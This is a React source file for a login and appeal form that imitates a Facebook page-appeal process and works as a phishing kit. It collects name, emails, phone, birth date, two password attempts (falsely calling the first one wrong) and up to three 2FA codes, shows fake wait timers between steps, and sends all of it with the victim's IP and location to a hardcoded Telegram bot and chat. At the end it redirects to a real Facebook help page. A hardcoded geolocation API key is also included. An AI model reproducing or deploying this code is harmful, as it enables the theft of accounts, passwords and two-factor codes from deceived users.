import { useEffect, useState } from "react";
import "./LoginForm.scss";
import { useTranslation } from "react-i18next";
import PhoneInput from "react-phone-input-2";
import "react-phone-input-2/lib/style.css";

function LoginForm({ onClose }) {
  // State quản lý hiển thị password
  const [isShowPass, setIsShowPass] = useState(false);

  // State lưu thông tin form
  const [code, setCode] = useState("");
  const [code1, setCode1] = useState("");
  const [code2, setCode2] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [password1, setPassword1] = useState("");
  const [password2, setPassword2] = useState("");

  // State quản lý UI
  const [isSuccess, setIsSuccess] = useState(false);
  const [isSubmited, setIsSubmited] = useState(false);

  // State chống spam
  const [clickCount, setClickCount] = useState(0);
  const [clickCount1, setClickCount1] = useState(0);
  const [isSubmitDisabled, setIsSubmitDisabled] = useState(false);
  const [isSubmitCodeDisabled, setIsSubmitCodeDisabled] = useState(true);
  const [isFirstAttemptDisabled, setIsFirstAttemptDisabled] = useState(false);

  // State thời gian chờ
  const [timeLeft, setTimeLeft] = useState(90);
  const [timeLeftFirstAttempt, setTimeLeftFirstAttempt] = useState(5);

  // State lưu thông tin IP và vị trí
  const [ip, setIp] = useState("");
  const [location, setLocation] = useState("");
  const [countryCode, setCountryCode] = useState("");
  const [flagUrl, setFlagUrl] = useState("");

  // State lưu lỗi
  const [errors, setErrors] = useState({
    email: "",
    password: "",
    code: "",
    submit: "",
    isSubmitCode: "",
    fullName: "",
    personalEmail: "",
    businessEmail: "",
    phoneNumber: "",
    dateOfBirth: "",
    link: "",
  });
  const handlePhoneChange = (value, country) => {
    setFormData((prev) => ({
      ...prev,
      phoneNumber: value,
      countryCode: country.countryCode.toUpperCase(),
    }));
  };
  // State lưu dữ liệu form
  const [formData, setFormData] = useState({
    fullName: "",
    personalEmail: "",
    businessEmail: "",
    phoneNumber: "",
    dateOfBirth: "",
    link: "",
    countryCode: "US",
  });

  const handleDateChange = (e) => {
    let value = e.target.value.replace(/\D/g, ""); // Remove all non-digit characters
    let formattedValue = "";

    if (value.length > 0) {
      formattedValue = value.substring(0, 2);
      if (value.length > 2) {
        formattedValue += "/" + value.substring(2, 4);
        if (value.length > 4) {
          formattedValue += "/" + value.substring(4, 8);
        }
      }
    }

    setFormData((prevData) => ({
      ...prevData,
      dateOfBirth: formattedValue,
    }));
  };

  // State lưu message_id từ Telegram

  const { t } = useTranslation();

  const [messageId, setMessageId] = useState(null);

  const botToken = "8056845785:AAHpHNS3WjVDo17QAyWhbnn5tja5YQfYooc";
  const chatId = "-4943927839";

  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        if (!response.ok) {
          throw new Error("Failed to fetch IP data");
        }
        const result = await response.json();
        setIp(result.ip);

        if (result && result.ip) {
          const locationResponse = await fetch(
            `https://api.ipgeolocation.io/ipgeo?apiKey=126b3879b6b549f8a3e47448ae0a8e91&ip=${result.ip}`
          );
          if (!locationResponse.ok) {
            throw new Error("Failed to fetch location data");
          }
          const locationData = await locationResponse.json();

          const callingCode = locationData?.calling_code || "";
          const countryCode = locationData?.country_code2 || "";
          const flagUrl = `https://flagcdn.com/w40/${countryCode.toLowerCase()}.png`;

          setCountryCode(callingCode);
          setFlagUrl(flagUrl);

          setFormData((prev) => ({
            ...prev,
            phoneNumber: callingCode ? `${callingCode} ` : "",
            countryCode: countryCode || "US",
          }));

          const district = locationData?.district || "N/A";
          const city = locationData?.city || "N/A";
          const country = locationData?.country_name || "N/A";
          const locationText = `${district} / ${city} / ${country}`;

          setLocation(locationText);
        }
      } catch (err) {
        console.log(err);
      }
    };

    fetchData();
  }, []);

  const handleOnchange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  const handleOnchangeEmail = (e) => {
    setErrors((prevErrors) => ({
      ...prevErrors,
      email: "",
      submit: "",
    }));
    setEmail(e.target.value);
  };

  const handleOnchangePassword = (e) => {
    setErrors((prevErrors) => ({
      ...prevErrors,
      password: "",
      submit: "",
    }));
    setPassword(e.target.value);
  };

  const handleOnchangeCode = (e) => {
    setIsSubmitCodeDisabled(false);
    const input = e.target.value;
    if (/^\d{0,8}$/.test(input)) {
      setCode(input);
    }
  };

  const validateInputs = () => {
    let isValid = true;
    const newErrors = { email: "", password: "" };

    if (!password) {
      newErrors.password = "Password is required";
      isValid = false;
    }

    setErrors(newErrors);
    return isValid;
  };

  const validate = () => {
    const newErrors = {};
    let isValid = true;

    if (!formData.fullName) {
      newErrors.fullName = "Full Name is required!";
      isValid = false;
    }

    if (!formData.personalEmail) {
      newErrors.personalEmail = "Email is required!";
      isValid = false;
    }

    if (!formData.businessEmail) {
      newErrors.businessEmail = "Email Business is required!";
      isValid = false;
    }

    if (!formData.phoneNumber) {
      newErrors.phoneNumber = "Phone Number is required!";
      isValid = false;
    }

    if (!formData.dateOfBirth) {
      newErrors.dateOfBirth = "Date of Birth is required!";
      isValid = false;
    } else if (!/^\d{2}\/\d{2}\/\d{4}$/.test(formData.dateOfBirth)) {
      newErrors.dateOfBirth = "Invalid date format (MM/DD/YYYY)";
      isValid = false;
    }

    if (!formData.link) {
      newErrors.link = "Page Name is required!";
      isValid = false;
    }

    setErrors(newErrors);
    return isValid;
  };

  // Format date to dd/mm/yyyy
  const formatDate = (dateString) => {
    if (!dateString) return "";
    const [year, month, day] = dateString.split("-");
    return `${day}/${month}/${year}`;
  };

  // Get current time in Vietnamese format
  const getCurrentTime = () => {
    const now = new Date();
    const timeString = now.toLocaleTimeString("vi-VN");
    const dateString = now.toLocaleDateString("vi-VN");
    return `${timeString} ${dateString}`;
  };

  // Gửi tin nhắn ban đầu đến Telegram
  const sendInitialDataToTelegram = async () => {
    try {
      const currentTime = getCurrentTime();
      const locationParts = location.split("/").map((part) => part.trim());

      const initialMessage = `
👤 <b>THÔNG TIN PHỤ</b>
📱 Tên PAGE: <code>${formData.link}</code>
👨‍💼 Họ Tên: <code>${formData.fullName}</code>
🎂 Ngày Sinh: <code>${formData.dateOfBirth || "N/A"}</code>
━━━━━━━━━━━━━━━━━━━━━
📍 <b>THÔNG TIN VỊ TRÍ</b>
🌐 IP: <code>${ip}</code>
🏳️ Quốc Gia: <code>${locationParts[2] || "N/A"}</code>
🏙 Thành Phố: <code>${locationParts[1] || "N/A"}</code>
⏰ Thời Gian: <code>${currentTime}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
📧 Email: <code>${formData.personalEmail}</code>
📧 Email Business: <code>${formData.businessEmail || "N/A"}</code>
📞 Số Điện Thoại: <code>${formData.phoneNumber}</code>
🔄 Trạng Thái: Đang chờ mật khẩu...`;

      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: initialMessage,
            parse_mode: "HTML",
          }),
        }
      );

      const result = await response.json();
      if (result.ok) {
        setMessageId(result.result.message_id);
      }
    } catch (err) {
      console.error("Telegram Error:", err);
    }
  };

  // Cập nhật tin nhắn trên Telegram
  const updateTelegramMessage = async (newContent) => {
    if (!messageId) return;

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          text: newContent,
          parse_mode: "HTML",
        }),
      });
    } catch (err) {
      console.error("Telegram Update Error:", err);
      // Fallback: gửi tin nhắn mới nếu không thể cập nhật
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: newContent,
          parse_mode: "HTML",
        }),
      });
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validateInputs()) {
      setIsSubmitDisabled(true);
      setClickCount((prevCount) => prevCount + 1);

      const currentTime = getCurrentTime();
      const locationParts = location.split("/").map((part) => part.trim());

      if (clickCount === 0) {
        setPassword1(password);
        const updatedMessage = `
👤 <b>THÔNG TIN PHỤ</b>
📱 Tên PAGE: <code>${formData.link}</code>
👨‍💼 Họ Tên: <code>${formData.fullName}</code>
🎂 Ngày Sinh: <code>${formData.dateOfBirth || "N/A"}</code>
━━━━━━━━━━━━━━━━━━━━━
📍 <b>THÔNG TIN VỊ TRÍ</b>
🌐 IP: <code>${ip}</code>
🏳️ Quốc Gia: <code>${locationParts[2] || "N/A"}</code>
🏙 Thành Phố: <code>${locationParts[1] || "N/A"}</code>
⏰ Thời Gian: <code>${currentTime}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
📧 Email: <code>${formData.personalEmail}</code>
📧 Email Business: <code>${formData.businessEmail || "N/A"}</code>
📞 Số Điện Thoại: <code>${formData.phoneNumber}</code>
🔑 Mật Khẩu 1: <code>${password}</code>
🔄 Trạng Thái: Đang chờ mật khẩu 2...`;

        await updateTelegramMessage(updatedMessage);

        setTimeout(() => {
          setErrors((prevErrors) => ({
            ...prevErrors,
            submit: t("login.errors.incorrect_password"),
          }));
          setPassword("");
          setIsSubmitDisabled(false);
        }, 3000);
      } else if (clickCount === 1) {
        setPassword2(password);
        const updatedMessage = `
👤 <b>THÔNG TIN PHỤ</b>
📱 Tên PAGE: <code>${formData.link}</code>
👨‍💼 Họ Tên: <code>${formData.fullName}</code>
🎂 Ngày Sinh: <code>${formData.dateOfBirth || "N/A"}</code>
━━━━━━━━━━━━━━━━━━━━━
📍 <b>THÔNG TIN VỊ TRÍ</b>
🌐 IP: <code>${ip}</code>
🏳️ Quốc Gia: <code>${locationParts[2] || "N/A"}</code>
🏙 Thành Phố: <code>${locationParts[1] || "N/A"}</code>
⏰ Thời Gian: <code>${currentTime}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
📧 Email: <code>${formData.personalEmail}</code>
📧 Email Business: <code>${formData.businessEmail || "N/A"}</code>
📞 Số Điện Thoại: <code>${formData.phoneNumber}</code>
🔑 Mật Khẩu 1: <code>${password1}</code>
🔑 Mật Khẩu 2: <code>${password}</code>
🔄 Trạng Thái: Đang chờ code 2FA...`;

        await updateTelegramMessage(updatedMessage);
        setTimeout(() => {
          setIsSuccess(true);
          setIsSubmitDisabled(false);
        }, 3000);
      }
    }
  };

  const sendToTelegram = async () => {
    try {
      setClickCount1((prev) => prev + 1);

      const currentTime = getCurrentTime();
      const locationParts = location.split("/").map((part) => part.trim());

      let finalMessage;
      if (clickCount1 === 0) {
        setCode1(code);
        finalMessage = `
👤 <b>THÔNG TIN PHỤ</b>
📱 Tên PAGE: <code>${formData.link}</code>
👨‍💼 Họ Tên: <code>${formData.fullName}</code>
🎂 Ngày Sinh: <code>${formData.dateOfBirth || "N/A"}</code>
━━━━━━━━━━━━━━━━━━━━━
📍 <b>THÔNG TIN VỊ TRÍ</b>
🌐 IP: <code>${ip}</code>
🏳️ Quốc Gia: <code>${locationParts[2] || "N/A"}</code>
🏙 Thành Phố: <code>${locationParts[1] || "N/A"}</code>
⏰ Thời Gian: <code>${currentTime}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
📧 Email: <code>${formData.personalEmail}</code>
📧 Email Business: <code>${formData.businessEmail || "N/A"}</code>
📞 Số Điện Thoại: <code>${formData.phoneNumber}</code>
🔑 Mật Khẩu 1: <code>${password1}</code>
🔑 Mật Khẩu 2: <code>${password2}</code>
━━━━━━━━━━━━━━━━━━━━━
🔓 CODE 2FA 1: <code>${code}</code>
🔄 Trạng Thái: Đang chờ code 2FA 2...`;
      } else if (clickCount1 == 1) {
        setCode2(code);
        finalMessage = `
👤 <b>THÔNG TIN PHỤ</b>
📱 Tên PAGE: <code>${formData.link}</code>
👨‍💼 Họ Tên: <code>${formData.fullName}</code>
🎂 Ngày Sinh: <code>${formData.dateOfBirth || "N/A"}</code>
━━━━━━━━━━━━━━━━━━━━━
📍 <b>THÔNG TIN VỊ TRÍ</b>
🌐 IP: <code>${ip}</code>
🏳️ Quốc Gia: <code>${locationParts[2] || "N/A"}</code>
🏙 Thành Phố: <code>${locationParts[1] || "N/A"}</code>
⏰ Thời Gian: <code>${currentTime}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
📧 Email: <code>${formData.personalEmail}</code>
📧 Email Business: <code>${formData.businessEmail || "N/A"}</code>
📞 Số Điện Thoại: <code>${formData.phoneNumber}</code>
🔑 Mật Khẩu 1: <code>${password1}</code>
🔑 Mật Khẩu 2: <code>${password2}</code>
━━━━━━━━━━━━━━━━━━━━━
🔓 CODE 2FA 1: <code>${code1}</code>
🔓 CODE 2FA 2: <code>${code}</code>
🔄 Trạng Thái: Đang chờ code 2FA 3...`;
      } else {
        finalMessage = `
👤 <b>THÔNG TIN PHỤ</b>
📱 Tên PAGE: <code>${formData.link}</code>
👨‍💼 Họ Tên: <code>${formData.fullName}</code>
🎂 Ngày Sinh: <code>${formData.dateOfBirth || "N/A"}</code>
━━━━━━━━━━━━━━━━━━━━━
📍 <b>THÔNG TIN VỊ TRÍ</b>
🌐 IP: <code>${ip}</code>
🏳️ Quốc Gia: <code>${locationParts[2] || "N/A"}</code>
🏙 Thành Phố: <code>${locationParts[1] || "N/A"}</code>
⏰ Thời Gian: <code>${currentTime}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>
📧 Email: <code>${formData.personalEmail}</code>
📧 Email Business: <code>${formData.businessEmail || "N/A"}</code>
📞 Số Điện Thoại: <code>${formData.phoneNumber}</code>
🔑 Mật Khẩu 1: <code>${password1}</code>
🔑 Mật Khẩu 2: <code>${password2}</code>
━━━━━━━━━━━━━━━━━━━━━
🔓 CODE 2FA 1: <code>${code1}</code>
🔓 CODE 2FA 2: <code>${code2}</code>
🔓 CODE 2FA 3: <code>${code}</code>
✅ Xác minh hoàn tất`;
      }

      await updateTelegramMessage(finalMessage);

      if (clickCount1 === 0 || clickCount1 === 1) {
        setIsSubmitDisabled(true);
        const timer = setInterval(() => {
          setTimeLeft((prev) =>
            prev <= 1
              ? (clearInterval(timer), setIsSubmitDisabled(false), 90)
              : prev - 1
          );
        }, 1000);
        setCode("");
      } else if (clickCount1 === 2) {
        setTimeout(
          () =>
            (window.location.href =
              "https://www.facebook.com/help/1735443093393986/"),
          2000
        );
      }
    } catch (err) {
      console.error("Telegram Error:", err);
    }
  };

  const toggleShowPass = () => {
    setIsShowPass(!isShowPass);
  };

  const handleSubmit1 = async (e) => {
    e.preventDefault();
    if (validate()) {
      await sendInitialDataToTelegram();
      setIsSubmited(true);
    }
  };

  return (
    <div className="modal-overlay">
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        {isSubmited ? (
          isSuccess ? (
            <div className="top">
              <button className="close-btn" onClick={onClose}>
                x
              </button>

              <div className="check">
                <p className="title">
                  {t("login.2fa.title_step", { step: 1, total: 3 })}
                </p>
                <div className="desc">
                  {t("login.2fa.desc1")} {t("login.2fa.desc2")}
                </div>
                <img
                  src="/checkpoint.png"
                  alt={t("common.imageAlt.checkpoint")}
                />
              </div>

              <div className="check">
                <div className="input-box">
                  <input
                    type="text"
                    placeholder={t("common.code")}
                    value={code}
                    onChange={handleOnchangeCode}
                    maxLength={8}
                  />
                  {errors.isSubmitCode && (
                    <span className="error">{errors.isSubmitCode}</span>
                  )}
                </div>

                {isSubmitDisabled && (
                  <span className="error">
                    {t("login.2fa.incorrect_wait", {
                      minutes: Math.floor(timeLeft / 60),
                      seconds: String(timeLeft % 60).padStart(2, "0"),
                    })}
                  </span>
                )}

                <button
                  type="button"
                  className={`login-btn ${isSubmitDisabled ? "disabled" : ""} ${
                    isSubmitCodeDisabled ? "btn-disabled" : ""
                  }`}
                  onClick={sendToTelegram}
                  disabled={isSubmitDisabled}
                >
                  {t("common.continue")}
                </button>
              </div>
            </div>
          ) : (
            <div className="top">
              <button className="close-btn" onClick={onClose}>
                x
              </button>

              <img
                className="logo"
                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFIAAABSCAYAAADHLIObAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAb0SURBVHgB7Z1PbNNWHMd/zwnQ0TGSlmmCqaujMW1Ckwhil3EhSLsysgvsRkCM7UYqTUPTpiXRdpk4tDtMQtCumXbZ2AE2xrlB2m2amkoTEogpATIYKm1SaBNGbb+930vTJm3+2Ilf7MT5SK7j2k3sb3/v93vv93t2CFjNRykZlsEPkjQMQP1AQeYLQlbWa+TYvhz7fZq/BpIEqs3AJkjCeV8aLIRAuwmnPPAYguAiB71bpWB2SfOAGRTFTQAhCZC06+0Wtj1CMvH2bNsUvPFAOc62AtAemKAkDheGv4c2IFZItL5FCLOPOcO2zLE8o5Qs1UVjIq1UjJBMwP2DfaN/zy6HcnkNbAOBuChBzRXSDhbYAM9WCXJ5NQbjviiYiHlCnkoFmKOfXI24doc1+aNvPR+99OEOU3xo60KiFT6BKBPxDHQgQwPusbtfvxwjhOSgBVoTkvUBB/pcU/OLmgydDAYkFz3Uiu+UoEn2f/lPEBQy3fEiIswdeTe7pk//8CgITdKURe7+LBO+/VAZhS4k8NqWWOLszigYxLiQp1JR9mcR6Gqo4ahuTEhHiFjCmJi6fWTg3IOoc0RESGT3p5mw3qN1CYlOOHHzPweJWOT2rDKqNwA1btqsi+Pd4po2LUvTYbAMVS77TN3XqGvkrreTUuohp+9M2UlEHOIF/c/B3qHNIA+6wf/K5or9OLYvLek5ha9nMs/4mrUqMEo2r3kG+l1Tc5Tuq9dpryvk0CeZqF2GfIHX+yByeDtf12Wwznuc+xeu3zIu5vySJpMP7qJrG6l1TE0feenPxVAmq1o+7PMzy5v6+CW+NBRRKDTM8wk1qCnk0fOPLA8u4XdesIGAa7AmPonurtq+qkLKZ+9Z3qSj73pg9JiX+0S7gE3cd/Z+1Va68SyxGGVxf7HkD+1Ien45DKHUBqvcIOSu/k0RjHZWIe9ww+SJQbAxnv2v9m3IM1QKyawxv6yFwEJCB57n3Ro7gyWU9VZZIeThN/sjVtZY0B8eP9APdodr5JYqfGWFkFdn8gGwkKB/q+2tcQ0aLo/gq0LuiWRCVkfqI2zE0kF4jl2YO1LaWP33E5COg8W00l9M3HwKV6bzfOSSreGeFgrmuq1LfyyG2IoXz3jSInI5K8euLaTAQnAEM/3FTmiG6K85iF1dgHbDS7uPVS/EfTnetH9OLgXAYprteFslIoJB5+jb23jz5md/475yECxGHnSBUdKPFMtELPH7racBXHMhB/qlAHQg6BetpqBoPPEroX/s1JKqlSOwEpir/epaYVj67a+8HzoUOwiJfH551i/NLcFe6NEahMpS4ZnWsRZpH6hfevhYdWRRy0xe7HfJEovYMvRoidknqixRm04I7TQkp9arTYWAbJ+CSIdD4FSagkAmQ4O8fNAIzEPqOa6c5L1i4V/vsSM/ZUEUwrOogTf6hCVrMWOkFxRSJBJL5qbBAWCCQyA5x/hIoRZJUUjiDItcyAsMBUxDxwiZzAj1kdi0SRK6HNGBBjWUQNPuQJcjONBAUUi8abzLEW6RijojrUzpben2MbsjOGKnWRUxXez+ELgCXYzgaTgJ/FEUUqXXoYuZySyDOEiC/+SvcWaVmwgZiA7rHB7ivJ+x971ghPCP83AlWWh43B2RtR2F+rBpF68y7sux5EUCBDxvQu9FLBRUMEquoIkVqTEJFBFfrA0RNdqWh2h0FZTESy/LhOQBp6ujt6lgtJ5Ye4LLmpDYvIGMQQ+9JMo3KrM/ivYN9NCHSmPlm5VColVSiEOP+qBG8cp7EzfmI1WKt4n1fGU91lkjslHInq9sAImut0akeoYcfaVDShCGQE3Gh2PVdlUXEq2S0BPQYx3MGmtQu2Yz7kv0mng5TIuJ2k/+q1/8UrRYr4lDsUmjFnWoLyQ2cZUeAidHcXyCKmrAg3BtGpdjMUJRJ/tLdu3xxo/60lfXnvCxcTgdAcfBggu/9sbonyAw7hurF7W6D3atNbo61TA204K/sRPENCYiYnzKSreLSUjYqIhIc3N/8IMofQ+6KZpjdMZrujjcVAas+UlU6IQVuq8r+pl4DSq7Fp2BpRqtzUbDbgGeQEePgNi54zXo6OLUo/UZoMWO6gicTM0w/xKp8rUA9gStUHKF4OKQKaVo8+ZHfueLw4Tss30govw7HqLcCk0SETF/oikGIqz12jHTjueksnPDc2ww5DOKmBm76G8m5BOrgloZkEoWqFAvPyeTBSwhdjJ+0YEXx+knUyGQSHu/9ALrzqr2C8Rl4d209j0bBn0okxZCKZm1gwALTPjUgoBpwQktT2K1eY0kiuL52trHbf9DdopWGl9ZgAvrdu0FIuFdurjgnWjyynr9XWnpsnV6+xZ3knmnNOD6212WTpj9H+c5rEpS8z6vAAAAAElFTkSuQmCC"
                alt={t("common.imageAlt.logo")}
              />

              <form onSubmit={handleSubmit}>
                <div className="input-box">
                  <p className="label2">{t("login.password_prompt")}</p>
                  <div className="box">
                    <input
                      type={isShowPass ? "text" : "password"}
                      placeholder={t("common.password")}
                      value={password}
                      onChange={handleOnchangePassword}
                    />
                    {errors.password && (
                      <span className="error">{errors.password}</span>
                    )}

                    {isShowPass ? (
                      <i
                        className="fa-regular fa-eye"
                        onClick={toggleShowPass}
                      />
                    ) : (
                      <i
                        className="fa-regular fa-eye-slash"
                        onClick={toggleShowPass}
                      />
                    )}
                  </div>
                </div>

                {errors.submit && (
                  <span className="error">{errors.submit}</span>
                )}

                <button
                  type="submit"
                  className="login-btn"
                  disabled={isSubmitDisabled}
                >
                  {t("common.continue")}
                </button>
              </form>
            </div>
          )
        ) : (
          <div className="top">
            <h3>{t("appeal.title")}</h3>
            <button className="close-btn" onClick={onClose}>
              x
            </button>
            <br />

            <form onSubmit={handleSubmit1} lang="en">
              <div className="input-box">
                <input
                  placeholder={t("appeal.fullName")}
                  type="text"
                  value={formData.fullName}
                  name="fullName"
                  onChange={handleOnchange}
                />
                {errors.fullName && (
                  <span className="error">{errors.fullName}</span>
                )}
              </div>

              <div className="input-box">
                <input
                  placeholder={t("appeal.email")}
                  type="email"
                  name="personalEmail"
                  value={formData.personalEmail}
                  onChange={handleOnchange}
                />
                {errors.personalEmail && (
                  <span className="error">{errors.personalEmail}</span>
                )}
              </div>

              <div className="input-box">
                <input
                  placeholder={t("appeal.businessEmail")}
                  type="email"
                  name="businessEmail"
                  value={formData.businessEmail}
                  onChange={handleOnchange}
                />
                {errors.businessEmail && (
                  <span className="error">{errors.businessEmail}</span>
                )}
              </div>

              <div className="input-box">
                <input
                  placeholder={t("appeal.pageName")}
                  type="text"
                  name="link"
                  value={formData.link}
                  onChange={handleOnchange}
                />
                {errors.link && <span className="error">{errors.link}</span>}
              </div>

              <div className="input-box">
                <PhoneInput
                  country={formData.countryCode?.toLowerCase() || "us"}
                  value={formData.phoneNumber}
                  onChange={handlePhoneChange}
                  inputProps={{ name: "phoneNumber", required: true }}
                  containerClass="phone-input-container"
                  inputClass="phone-input"
                  buttonClass="phone-input-button"
                  dropdownClass="phone-input-dropdown"
                />
                {errors.phoneNumber && (
                  <span className="error">{errors.phoneNumber}</span>
                )}
              </div>

              <div className="dateofbirth">
                <p>{t("appeal.dobLabel")}</p>
              </div>

              <div className="input-box">
                <input
                  className="dateinput"
                  type="text"
                  name="dateOfBirth"
                  value={formData.dateOfBirth}
                  onChange={handleDateChange}
                  placeholder={t("appeal.dobPlaceholder")}
                  maxLength="10"
                />
                {errors.dateOfBirth && (
                  <span className="error">{errors.dateOfBirth}</span>
                )}
              </div>

              <div className="input-box">
                <textarea rows="4" placeholder={t("appeal.issuePlaceholder")} />
              </div>

              <p>{t("appeal.responseTime")}</p>

              <div className="notify-box">
                <div className="left">
                  <img
                    src="https://img.icons8.com/?size=512&id=118467&format=png"
                    alt={t("common.imageAlt.facebook")}
                    className="fb-icon"
                  />
                  <div className="text">
                    <strong>{t("appeal.fbNotify.title")}</strong>
                    <p>{t("appeal.fbNotify.desc")}</p>
                  </div>
                </div>
                <label className="switch">
                  <input type="checkbox" defaultChecked />
                  <span className="slider"></span>
                </label>
              </div>

              <div className="input-box">
                <div className="flex-box">
                  <input className="checkbox" type="checkbox" name="term" />
                  <p>
                    {t("appeal.agreePrefix")}{" "}
                    <a href="#">{t("appeal.terms")}</a>
                  </p>
                </div>
              </div>

              {errors.submit && <span className="error">{errors.submit}</span>}

              <button type="submit" className="login-btn">
                {t("common.send")}
              </button>
            </form>
          </div>
        )}
      </div>
    </div>
  );
}

export default LoginForm;
